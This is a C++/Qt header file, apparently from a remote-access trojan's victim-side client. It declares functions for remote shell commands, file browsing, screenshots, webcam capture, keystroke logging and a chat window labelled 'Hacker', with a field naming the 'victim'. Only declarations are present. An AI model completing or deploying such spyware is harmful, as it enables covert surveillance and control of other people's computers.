/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#ifdef Q_WS_X11
#include "../../lib/headers/webcamlin.h"
#include "../../lib/headers/tecladoyratonlin.h"
#else
#include "../../lib/headers/webcamwin.h"
#include "../../lib/headers/tecladoyratonwin.h"
#endif

#include <QMainWindow>
#include <QTcpSocket>
#include <QFile>
#include <QFileInfo>
#include <QDataStream>
#include <QDir>
#include <QMessageBox>
#include <QProcess>
#include <QTimer>
#include "../../lib/headers/Utilidades.h"
#include <QWaitCondition>
#include <QDesktopWidget>
#include <QBuffer>
#include <QVBoxLayout>
#include <QPushButton>
#include <QLineEdit>
#include <QPlainTextEdit>

namespace Ui {
    class MainWindow;
}

class MainWindow : public QMainWindow {
    Q_OBJECT
public:
    MainWindow(QWidget *parent = 0);
    ~MainWindow();
    Utilidades util;
    QString host;
    quint16 port;
    quint16 portArchivos;
    quint16 portEscritorio;
    quint16 portWebcam;
    int tiempoConexion;
    QString alias;
    QString nickVictima;
    QString nombreCopiable;
    QMessageBox *mensaje;
    QString archivo;
    QDir directorio;
    QTimer temporizador;
    QTimer verTecla;
    QFile log;
    QProcess proceso;
    QProcess consola;
    QByteArray cadenaa;
    QTcpSocket socket;
    QTcpSocket socketArchivos;
    QTcpSocket socketEscritorio;
    QTcpSocket socketWebcam;
    QBuffer *buffer;
    QByteArray bytes;
    QWidget *chat;
    QVBoxLayout *capa;
    QHBoxLayout *capaHorizontal;
    QPushButton *botonChatEnviar;
    QLineEdit *enviarChatTexto;
    QPlainTextEdit *salidaChatTexto;
    void generarVentanaChat();
public slots:
    void inicio();
    bool cargarConfiguracion();
    void conectar();
    void llegadaDatos();
    void llegadaDatosArchivo();
    void llegadaDatosEscritorio();
    void llegadaDatosWebcam();
    QPixmap screenShot();
    void desconectado();
    QString shell(QString comando);
    void reiniciar();
    void listarUnidades();
    void listarArchivos(QString ruta);
    void listarDirectorios(QString ruta);
    void mostrarMensaje(QString tipo,QString titulo,QString texto);
    void datosEscritos();
    void abrirChat();
    void cerrarChat();
    void enviarMensajeChat();
    void ponerMensajeChat(QString mensajeChat,QString quien = "Hacker");
    void escucharTeclas();
protected:
    void changeEvent(QEvent *e);
private:
    Ui::MainWindow *ui;
};


#endif // MAINWINDOW_H
